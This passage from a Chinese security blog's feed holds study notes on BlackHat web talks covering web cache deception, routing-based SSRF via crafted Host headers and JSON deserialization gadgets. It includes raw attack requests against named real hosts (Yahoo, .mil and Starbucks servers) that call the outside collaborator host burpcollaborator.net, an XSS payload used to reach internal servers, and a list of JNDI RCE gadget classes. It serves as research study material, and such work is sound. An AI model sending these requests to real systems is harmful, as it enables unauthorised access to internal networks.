Chains（反序列化Gadget链自动发掘）"></a>0x06 Automated Discovery of Deserialization Gadget Chains（反序列化Gadget链自动发掘）</h2><p>PDF：</p><p><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf</a></p><p><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf</a></p><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>作者对已有的反序列化漏洞利用工具进行了调研分析，其中ysoserial主要是针对某些特定库以及JDK ObjectInputStream的漏洞利用，但是对于非标准库的场景就没法利用了。作者针对Java提出了一种可自动发现反序列化工具链的技术，并研发了基于Java字节码发掘反序列化Gadget链的工具Gadget Inspector。</p><p>工具地址：<a href="https://github.com/JackOfMostTrades/gadgetinspector" target="_blank" rel="noopener">https://github.com/JackOfMostTrades/gadgetinspector</a></p><p>在研发过程中，作者枚举war包中类、方法的层次关系，发掘了直通数据流和调用图，并在此基础上使用已知的tricks枚举了可能源，最后在数据流的调用图中使用BFS算法发掘Gadget链。在性能表现上，Gadget Inspector支持对最受欢迎的前100个Java库的检测，并且在检测效果中可以发掘一些最新的Gadget链。虽然有少量的误报，但这些误报大多来自反射链。</p><p>该工具后面会深入研究，这里先不浅谈了。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="BlackHat" scheme="https://www.mi1k7ea.com/tags/BlackHat/"/>
    
  </entry>
  
  <entry>
    <title>BlackHat 2017 Web小结</title>
    <link href="https://www.mi1k7ea.com/2020/04/19/BlackHat-2017-Web%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/04/19/BlackHat-2017-Web小结/</id>
    <published>2020-04-19T06:43:43.000Z</published>
    <updated>2020-04-19T17:05:28.729Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近整理下BlackHat 2017 Web相关议题，做下学习笔记。</p><h2 id="0x01-WEB-CACHE-DECEPTION-ATTACK（Web缓存欺骗攻击）"><a href="#0x01-WEB-CACHE-DECEPTION-ATTACK（Web缓存欺骗攻击）" class="headerlink" title="0x01 WEB CACHE DECEPTION ATTACK（Web缓存欺骗攻击）"></a>0x01 WEB CACHE DECEPTION ATTACK（Web缓存欺骗攻击）</h2><p>PDF：<a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack.pdf</a></p><p>相关参考：<a href="https://www.freebuf.com/articles/web/187538.html" target="_blank" rel="noopener">一种新型的Web缓存欺骗攻击技术</a></p><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><blockquote><p>先简单介绍一下WEB缓存技术，它主要是缓存一些静态的，公开的文件，如CSS文件，JS文件，图片等。缓存分两类，一类是本地缓存，通过在浏览器上缓存实现，缓存之后通过F5刷新是不会重新获取已缓存文件的，通过Ctrl +F5强制刷新才会重新获取。另一类是在服务端实现，也就是在CDN、负载均衡、反向代理（后面统称缓存服务器）上实现，这次介绍的攻击技术就是针对这一种缓存。服务端的缓存原理是：客户端请求一个静态文件，如果缓存服务器没有缓存过这个文件，就会像WEB服务器请求，获取到静态文件返回给客户端，同时将这个文件缓存下来，下次再遇到同样的请求时就直接返回，直到这个缓存文件过期。</p><p>接下来讲一下WEB服务器解析的问题。假设客户端请求<a href="http://www.example.com/home.php/nonexistent.css" target="_blank" rel="noopener">http://www.example.com/home.php/nonexistent.css</a> 这个URL，其中home.php是真实存在的，而nonexistent.css不存在，那WEB服务器会怎么处理呢？针对这种情况的处理跟WEB服务器用的技术以及配置相关，有的会返回404 not found，有的会返回200 OK，然后把home.php返回回来。如果服务器返回200 OK就要注意了，这时缓存服务器拿到的请求是<a href="http://www.example.com/home.php/nonexistent.css，是一个静态页面，而WEB服务器返回给缓存服务器的结果是http://www.example.com/home.php，不是一个静态页面，但是缓存服务器并不知道。" target="_blank" rel="noopener">http://www.example.com/home.php/nonexistent.css，是一个静态页面，而WEB服务器返回给缓存服务器的结果是http://www.example.com/home.php，不是一个静态页面，但是缓存服务器并不知道。</a></p></blockquote><p>攻击原理如图：</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/1.png" alt=""></p><ol><li>攻击者引诱已登录的用户（受害者）访问<a href="https://www.bank.com/account.do/logo.png" target="_blank" rel="noopener">https://www.bank.com/account.do/logo.png</a></li><li>受害者请求<a href="https://www.bank.com/account.do/logo.png" target="_blank" rel="noopener">https://www.bank.com/account.do/logo.png</a></li><li>缓存服务器接收到请求，没查到这个页面，于是向WEB服务器请求</li><li>WEB服务器返回<a href="https://www.bank.com/account.do，状态码是200" target="_blank" rel="noopener">https://www.bank.com/account.do，状态码是200</a> OK</li><li>缓存服务器收到结果，由于状态码是200 OK，会认为URL保持不变，然后由于这个URL以.png结尾，认为它是一个静态文件，于是会缓存这个文件</li><li>受害者得到正常结果</li><li>攻击者访问<a href="https://www.bank.com/account.do/logo.png，请求到达缓存服务器，缓存服务器直接返回受害者的缓存账户页面给攻击者，攻击完成。" target="_blank" rel="noopener">https://www.bank.com/account.do/logo.png，请求到达缓存服务器，缓存服务器直接返回受害者的缓存账户页面给攻击者，攻击完成。</a></li></ol><p>防御方法：</p><ol><li>配置缓存服务器根据http header来判断是否缓存页面；</li><li>将所有静态文件放在指定的目录，只缓存这个目录里的文件；</li><li>配置WEB服务器在解析类似<a href="http://www.example.com/home.php/nonexistent.css" target="_blank" rel="noopener">http://www.example.com/home.php/nonexistent.css</a> 这种页面时返回404或者302。</li></ol><p>更多的看参考文章即可。</p><h2 id="0x02-CRACKING-THE-LENS-TARGETING-HTTP’S-HIDDEN-ATTACK-SURFACE（HTTP的隐藏攻击面）"><a href="#0x02-CRACKING-THE-LENS-TARGETING-HTTP’S-HIDDEN-ATTACK-SURFACE（HTTP的隐藏攻击面）" class="headerlink" title="0x02 CRACKING THE LENS: TARGETING HTTP’S HIDDEN ATTACK-SURFACE（HTTP的隐藏攻击面）"></a>0x02 CRACKING THE LENS: TARGETING HTTP’S HIDDEN ATTACK-SURFACE（HTTP的隐藏攻击面）</h2><p>PDF：<a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Kettle-Cracking-The-Lens-Exploiting-HTTPs-Hidden-Attack-Surface.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/wednesday/us-17-Kettle-Cracking-The-Lens-Exploiting-HTTPs-Hidden-Attack-Surface.pdf</a></p><p>PortSwigger博客参考：<a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface" target="_blank" rel="noopener">https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface</a></p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>访问Web站点通常会经过许多隐藏的服务系统（包括反向代理、负载均衡器、后端分析系统等），这些系统主要用来提升用户体验、提取统计数据或提供其他服务等。正因为其隐藏的特点，导致这一层不可见的攻击面被忽略了很久。</p><p>作者使用畸形请求和特殊HTTP头是隐藏系统暴露自己，并打开了攻击内网的大门。其中，作者分享了几个隐藏系统的漏洞案例，包括Yahoo的若干服务器、拦截篡改细腻的英国ISP（BT）、哥伦比亚的ISP，将反射型XSS升级为SSRF的军方服务器等。</p><h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><h4 id="Listening监听"><a href="#Listening监听" class="headerlink" title="Listening监听"></a>Listening监听</h4><p>隐藏系统本身被设计为隐藏的、外部无感知的，因此无法通过响应报文来识别它们的漏洞。可以通过发送特殊的报文来让这些系统主动连接我们，然后分析产生的DNS lookup和HTTP请求，识别可能存在的漏洞。</p><p>作者使用Burp Collaborator记录了这些请求，但也可以会用自己的DNS服务器，或者使用<a href="https://canarytokens.org/" target="_blank" rel="noopener">CanaryTokens</a>。</p><h4 id="Research-Pipeline"><a href="#Research-Pipeline" class="headerlink" title="Research Pipeline"></a>Research Pipeline</h4><p>作者首先使用简单的Burp匹配/替换规则将硬编码的pingback payload注入到所有浏览器流量中。这种方法以失败告终，因为有效负载造成了如此多的pingback，以致于很难将每个单独的pingback相关联并确定哪个网站触发了它。很快也很明显，某些有效负载会在三分钟，几小时甚至每24小时一次的延迟后引起pinging。</p><p>为了有效地对pingback进行分类，作者写了Collaborator Everywhere，这是一个简单的Burp扩展，它将包含唯一标识符的payload注入所有代理流量中，并使用它们自动将pingback与相应的攻击相关联。如下图，Netflix在作者访问其网站四个小时后访问了Referer标头中指定的URL，并假装是在x86 CPU上运行的iPhone：</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/2.png" alt=""></p><h4 id="Scaling-up扩大攻击面"><a href="#Scaling-up扩大攻击面" class="headerlink" title="Scaling up扩大攻击面"></a>Scaling up扩大攻击面</h4><p>测试目标域名和IP地址是从合法的漏洞奖励计划网站中筛选的。</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/3.png" alt=""></p><p>为使发出的报文尽可能触发漏洞，HTTP头处理如下：</p><ul><li>Host头带多个hostname；</li><li>设置X-Forwarded-Proto头，标识Client与代理服务器之间使用的协议；</li><li>设置Cache-Control头为no-transform，禁止中间代理服务器处理请求报文；</li><li>设置Max-Forwards最大转发次数；</li></ul><p><img src="/2020/04/19/BlackHat-2017-Web小结/4.png" alt=""></p><h3 id="案例——Misrouting-Requests"><a href="#案例——Misrouting-Requests" class="headerlink" title="案例——Misrouting Requests"></a>案例——Misrouting Requests</h3><p>攻击者通过特殊的Host头来操控反向代理服务器向攻击者指定的目标发送请求，可以理解为使SSRF的变种。</p><p>反向代理服务器在组网中用于连接外网和内网，这就导致其有被SSRF利用的风险。</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/5.png" alt=""></p><h4 id="Invalid-Host"><a href="#Invalid-Host" class="headerlink" title="Invalid Host"></a>Invalid Host</h4><p>触发回调的最简单方法是发送不正确的HTTP Host标头：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: uniqid.burpcollaborator.net</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>成功利用的案例：</p><ul><li>27 DoD servers</li><li>ats-vm.lorax.bf1.yahoo.com</li><li>My ISP</li><li>Colombian ISP doing DNS poisoning</li></ul><p>这里看下作者对ats-vm.lorax.bf1.yahoo.com的利用</p><p>一开始还不清楚服务端运行的是什么应用软件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: XX.X.XXX.XX:8082</span><br></pre></td></tr></table></figure><p><img src="/2020/04/19/BlackHat-2017-Web小结/6.png" alt=""></p><p>接着，通过HELP命令得知了服务端运行的应用软件信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HELP / HTTP/1.1</span><br><span class="line">Host: XX.X.XXX.XX:8082</span><br></pre></td></tr></table></figure><p><img src="/2020/04/19/BlackHat-2017-Web小结/7.png" alt=""></p><p>来自服务器的众多“Unknown Command”将请求的每一行解释为单独的命令-它使用的是换行符终止的协议，这将使通过经典SSRF进行利用变得极为困难或不可能。</p><p>但幸运的是，基于路由的SSRF更加灵活，能够使用包含选择的命令的POST样式的主体发出GET请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: XX.X.XXX.XX:8082</span><br><span class="line">Content-Length: 34</span><br><span class="line"></span><br><span class="line">GET proxy.config.alarm_email</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 Connection Established</span><br><span class="line">Date: Tue, 07 Feb 2017 16:57:02 GMT</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: keep alive</span><br></pre></td></tr></table></figure><p><img src="/2020/04/19/BlackHat-2017-Web小结/8.png" alt=""></p><p>之后，再使用SET命令就可以对Yahoo的负载均衡器池进行广泛的配置更改，包括启用SOCKS代理并授予我的IP地址权限，以将项目直接推送到其缓存中。</p><h4 id="Handling-input-permutation"><a href="#Handling-input-permutation" class="headerlink" title="Handling input permutation"></a>Handling input permutation</h4><p>作者在测试中遇到个别服务器收到下面这个请求后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: burpcollaborator.net</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>会转发出这样的请求，即Host值放入URL中拼接两次作为URL Path，同时Host值加了outage前缀：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /burpcollaborator.net/burpcollaborator.net HTTP/1.1</span><br><span class="line">Host: outage.burpcollaborator.net</span><br><span class="line">Via: o2-b.ycpi.tp2.yahoo.net</span><br></pre></td></tr></table></figure><p>如何利用？——注册域名到内网地址，实现向内网发送请求。此外，还有vcap.me，这是一个公开的域名，其所有子域名都会被解析为127.0.0.1，再利用<code>../</code>跨路径，实现对内网<code>http://127.0.0.1</code>的访问。</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/9.png" alt=""></p><p>那么，构造的利用请求报文如下即可：</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/10.png" alt=""></p><p>服务端在归一化处理后得到的请求为<code>http://outage.vcap.me/?x=.vcap.me</code>，等同于<code>http://127.0.0.1/</code>的访问。</p><h4 id="Host-overriding"><a href="#Host-overriding" class="headerlink" title="Host overriding"></a>Host overriding</h4><p>在URI中的Host可以替换为Host头的值。</p><p>有些服务器会对Host头的值进行校验，但会忽视利用URI也可以传递Host头值并且比Header的优先级更高。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET http://internal-website.mil/ HTTP/1.1</span><br><span class="line">Host: xxxxxxx.mil</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><h4 id="Ambiguous-requests"><a href="#Ambiguous-requests" class="headerlink" title="Ambiguous requests"></a>Ambiguous requests</h4><p>含糊不清的请求，即会引起歧义的请求。</p><p>通过<code>username:pass@domainname</code>的形式来混淆域名，incapsula防火墙通过端口号来提取域名，如下面的Host头的值，防火墙认为端口号是80，域名为incapsula-client.net（合法），但实际请求转发到目标服务器后解析获取的URL为burp-collaborator.net：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: incapsula-client.net:80@burp-collaborator.net</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><h4 id="Breaking-expectations"><a href="#Breaking-expectations" class="headerlink" title="Breaking expectations"></a>Breaking expectations</h4><p>还可以在URI中传递不以<code>/</code>开头、包含<code>@</code>的路径来混淆URL。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Url backendURL = &quot;http://public-backend/&quot;;</span><br><span class="line">String uri = ctx.getRequest().getRawUri();</span><br><span class="line"></span><br><span class="line">URI proxyUri;</span><br><span class="line">try &#123;</span><br><span class="line">proxyUri = new URIBuilder(uri)</span><br><span class="line">        .setHost(backendURL.getHost())</span><br><span class="line">        .setPort(backendURL.getPort())</span><br><span class="line">        .setScheme(backendURL.getScheme())</span><br><span class="line">        .build();</span><br><span class="line">&#125; catch (URISyntaxException e) &#123;</span><br><span class="line">    Util.sendError(ctx, 400, INVALID_REQUEST_URL);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对上述处理，使用下面请求报文，实际得到的URL域名被攻击者替换为了<code>http://public-backend@burp-collaborator.net</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET @burp-collaborator.net/ HTTP/1.1</span><br><span class="line">Host: newrelic.com</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><h4 id="Tunnels"><a href="#Tunnels" class="headerlink" title="Tunnels"></a>Tunnels</h4><p>去掉@后的URL变形，观察会不会有服务器向xyz.burpcollaborator.net发送请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET xyz.burpcollaborator.net:80/bar HTTP/1.1</span><br><span class="line">Host: demo.globaleaks.org</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>收到了globaleaks.org服务器怪异的请求，多次pingback：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xYZ.BurpcoLLABoRaTOR.neT.    from 89.234.157.254</span><br><span class="line">Xyz.burPColLABorAToR.nET.    from 62.210.18.16 </span><br><span class="line">xYz.burpColLaBorATOR.net.    from 91.224.149.254</span><br></pre></td></tr></table></figure><p>经分析发现，跟globaleaks使用的Tor2web做隐匿请求的处理有关。</p><h3 id="案例——Targeting-auxiliary-systems"><a href="#案例——Targeting-auxiliary-systems" class="headerlink" title="案例——Targeting auxiliary systems"></a>案例——Targeting auxiliary systems</h3><p>此外，还可以关注相关备用系统的利用。</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/12.png" alt=""></p><h4 id="Gathering-information"><a href="#Gathering-information" class="headerlink" title="Gathering information"></a>Gathering information</h4><p>收集信息。除了Host头，其他头字段也能被利用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: store.starbucks.ca</span><br><span class="line">X-Forwarded-For: a.burpcollaborator.net</span><br><span class="line">True-Client-IP: b.burpcollaborator.net</span><br><span class="line">Referer: http://c.burpcollaborator.net/</span><br><span class="line">X-WAP-Profile: http://d.burpcollaborator.net/wap.xml</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>具体几个头字段的利用看作者博客即可。</p><h4 id="Pre-emptive-caching"><a href="#Pre-emptive-caching" class="headerlink" title="Pre-emptive caching"></a>Pre-emptive caching</h4><p>预缓存。</p><p>看个将反射型XSS提升至SSRF的案例。一个军方的服务器有预缓存的行为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: burpcollaborator.net</span><br></pre></td></tr></table></figure><p>随后收到如下请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /jquery.js HTTP/1.1</span><br><span class="line">GET /abrams.jpg HTTP/1.1</span><br></pre></td></tr></table></figure><p>缓存服务器收到<code>&lt;img src=&quot;/a.jpg&quot;/&gt;</code>这样的内容时，会拿Host头发出这样的请求来预加载资源：<code>http://burpcollaborator.net/a.jpg</code></p><p>作者在后端应用中找到一个反射型XSS，注入一段访问内网服务器上的图片的语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /xss.cgi HTTP/1.1</span><br><span class="line">Content-Length: 103</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">xss=&lt;img src=&quot;http://internal-server.mil/index.php/fake.jpg&quot;/&gt;</span><br></pre></td></tr></table></figure><p>然后缓存服务器将缓存它并可从外网访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php/fake.jpg</span><br><span class="line">Host: internal-server.mil</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>整个攻击过程如图：</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/11.png" alt=""></p><h2 id="0x03-JSON-ATTACKS"><a href="#0x03-JSON-ATTACKS" class="headerlink" title="0x03 JSON ATTACKS"></a>0x03 JSON ATTACKS</h2><p>PDF：<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf</a></p><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>本次议题讲的就是JSON库反序列化漏洞及其Gadgets的内容。其中包括Fastjson、Jackson等反序列化漏洞的研究，基本原理这些这里不再赘述，只对一些JSON反序列化Tips进行记录即可。</p><p>JSON如果只传递简单对象，一般是安全的。但是如果传递的是Java对象或者.NET对象，则会容易存在安全问题。</p><p>Java反序列化和.NET BinaryFormat反序列化容易被攻击，这是因为它们在处理过程中会调用一系列的回调函数，而这些回调函数如果存在危险调用或操作则就造成了反序列化漏洞的存在。<strong>整个攻击可归结为攻击者能够控制反序列化对象图中的对象类型，而该类型的反序列化回调逻辑可以被利用来执行任意代码。</strong></p><p>反序列化对象图，类似于HTML页面的DOM树，DOM树包含一系列的标签，标签间有层次关系。要反序列化的对象可能继承于某个类型、可以有多种类型的成员变量，这些被包含的对象又有类型的结构，展开就像DOM树一样也是一张图，被称为对象图。</p><p>反序列化攻击中，攻击者要能控制对象图中某个对象，注入Gadgets类型来实现攻击。而Gadgets类型就是在其反序列化回调过程中可以注入恶意代码并被执行的类，比如JDK的TemplatesImpl类。因此，<strong>反序列化漏洞研究的思路可以归结为两点：如何控制对象类型和寻找Gadgets类型</strong>。</p><h3 id="JSON反序列化过程"><a href="#JSON反序列化过程" class="headerlink" title="JSON反序列化过程"></a>JSON反序列化过程</h3><p>JSON反序列化就是JSON unmarshaller根据JSON数据（字符串）重新构造出对象（Object）。</p><p>其中，最常见的几种实现方法如下：</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/13.png" alt=""></p><h4 id="通过默认构造函数与反射实现"><a href="#通过默认构造函数与反射实现" class="headerlink" title="通过默认构造函数与反射实现"></a>通过默认构造函数与反射实现</h4><p>Java的JSON-IO库、经典的.NET deserializer（当反序列化类型有@Serializable注解但没有实现ISerializable接口）。这些JSON反序列化过程会调用一些函数，而如果这些函数中存在危险操作则存在反序列化漏洞的风险：</p><ul><li>析构函数，如Finalize()，对象被垃圾回收时触发；</li><li>一些类型不能通过反射来构建，例如.NET的Hashtable，hash值需要重新计算，因此很多方法如HashCode()、Equal()、Compare()等可能被调用；</li><li>其他可能调用到的方法，如异常处理器调用toString()；</li></ul><h4 id="通过默认构造函数与setters实现"><a href="#通过默认构造函数与setters实现" class="headerlink" title="通过默认构造函数与setters实现"></a>通过默认构造函数与setters实现</h4><p>与前一个方法类似，但不使用反射，而使用property/field的set方法（setters）来操作对象的fields。</p><p>通常这样的反序列化器只处理public的property/field，比前一个方法限制多一些。尽管如此，大部分的反序列化器使用这种方案。但是，某些情况下，反序列化器会通过反射调用private setter。</p><p>因为标准库和三方库中普遍存在自定义setter，因此Gadgets类型的范围非常广，这也是为啥Jackson和Fastjson不断爆出新的绕过黑名单的Gadgets CVE的原因（通过对Fastjson和Jackson的分析，这些库对于Map、Collection类型的数据支持通过getter方法设置值，等同于setter）。</p><h4 id="通过特殊构造函数-类型转换器-回调函数实现"><a href="#通过特殊构造函数-类型转换器-回调函数实现" class="headerlink" title="通过特殊构造函数/类型转换器/回调函数实现"></a>通过特殊构造函数/类型转换器/回调函数实现</h4><p>Java和.NET的反序列化回调方法，比如Json.NET的OnError属性，Java的readObject()，.NET中ISerializable的特殊构造函数，.NET中OnDeserialized和OnDeserializing注解的方法，XmlSerializer中IXmlSerializable的ReadXml()等。</p><p>JSON库的反序列化器提供注解的反序列化回调函数的情况很少见，一些库会调用到Java/.NET的反序列化回调。</p><p><strong>由此可见，JSON反序列化过程没有调用Object deserialization（Java原生反序列化）的callbacks，因此Java反序列化的Gadgets类型大多数对JSON反序列化是没用的。</strong></p><p>当然，也有个别方法在JSON反序列化过程中被调用，可以根据此启动Gadget链：</p><ul><li>Non-default constructor</li><li>Setters</li><li>Type Converters（.NET特有）</li></ul><p>作者发现大多数JSON库都调用setter方法来处理对象成员，因此关注点应该放在那些会导致任意代码执行的setter方法中（大多数Gadget类型的特性）。</p><p><strong>JSON库判断field是否存在、如何确定setter方法，不同的库有各自的实现，这两点如果处理不好就导致漏洞的存在，同时这两点也是分析反序列化新Gadget的重点。</strong></p><h3 id="RCE-Gadgets"><a href="#RCE-Gadgets" class="headerlink" title="RCE Gadgets"></a>RCE Gadgets</h3><p>作者提及的几个Gadgets。</p><p>注意：JDK8u121默认禁止了通过JNDI对象Factory来加载远程Class，但不影响LDAP的利用方式。具体参考JNDI注入的文章。</p><h4 id="org-hibernate-jmx-StatisticsService"><a href="#org-hibernate-jmx-StatisticsService" class="headerlink" title="org.hibernate.jmx.StatisticsService"></a>org.hibernate.jmx.StatisticsService</h4><p>setSessionFactoryJNDIName() -&gt; JNDI lookup    </p><h4 id="com-atomikos-icatch-jta-RemoteClientUserTransaction"><a href="#com-atomikos-icatch-jta-RemoteClientUserTransaction" class="headerlink" title="com.atomikos.icatch.jta.RemoteClientUserTransaction"></a>com.atomikos.icatch.jta.RemoteClientUserTransaction</h4><p>toString() -&gt; JNDI lookup    </p><h4 id="com-sun-rowset-JdbcRowSetImpl"><a href="#com-sun-rowset-JdbcRowSetImpl" class="headerlink" title="com.sun.rowset.JdbcRowSetImpl"></a>com.sun.rowset.JdbcRowSetImpl</h4><p>setAutoCommit() -&gt; JNDI lookup，JDK自带</p><h4 id="org-antlr-stringtemplate-StringTemplate"><a href="#org-antlr-stringtemplate-StringTemplate" class="headerlink" title="org.antlr.stringtemplate.StringTemplate"></a>org.antlr.stringtemplate.StringTemplate</h4><p>toString()，可以被利用来和其他Gadget类形成Gadget利用链，比如TemplatesImpl.getOutputProperties() </p><h3 id="各种JSON库的安全性与漏洞模式"><a href="#各种JSON库的安全性与漏洞模式" class="headerlink" title="各种JSON库的安全性与漏洞模式"></a>各种JSON库的安全性与漏洞模式</h3><p>Default：默认支持类型指定；Configuration：通过配置可支持类型指定。</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/14.png" alt=""></p><h4 id="Jackson"><a href="#Jackson" class="headerlink" title="Jackson"></a>Jackson</h4><p>通过ObjectMapper.enableDefaultTyping()全局使能动态类型指定（当然还有注解的方式即<code>@JsontypeInfo</code>），并且支持通过参数限定哪些类型的成员变量支持动态类型，包括：</p><ul><li>JAVA_LANG_OBJECT：仅影响Object.class类型的属性；</li><li>OBJECT_AND_NON_CONCRETE：影响Object.class和所有non-concrete类型（抽象类、接口等）；</li><li>NON_CONCRETE_AND_ARRAYS：同时，另加所有数组类型（元素均为Object.class和所有non-concrete类型）；</li><li>NON_FINAL：影响所有不声明为final的类型，以及元素中为non_final类型的数组；</li></ul><p><strong>Jackson反序列化过程中会调用被反序列化类的setter方法，并没有进行任何的类型检查。</strong></p><h4 id="Genson"><a href="#Genson" class="headerlink" title="Genson"></a>Genson</h4><p>通过useRuntimeType()开关使能动态类型绑定，这点和Jackson的enableDefaultTyping()类似。</p><p>Genson有对象图的类型检查，因此要实现RCE需要在反序列化的类型中找到入口点。</p><p><strong>同样，Genson反序列化过程中会调用被反序列化类的setter方法。</strong></p><h4 id="JSON-IO"><a href="#JSON-IO" class="headerlink" title="JSON-IO"></a>JSON-IO</h4><p>JSON-IO的反序列化：</p><ul><li>调用反射设置值，不调用setter方法；</li><li>反序列化过程中出现异常时会调用待反序列化的类的toString()方法；</li></ul><p>攻击者可以故意在某个成员的赋值时触发异常，在toString()函数中注入恶意代码实现攻击。</p><h4 id="FlexSON"><a href="#FlexSON" class="headerlink" 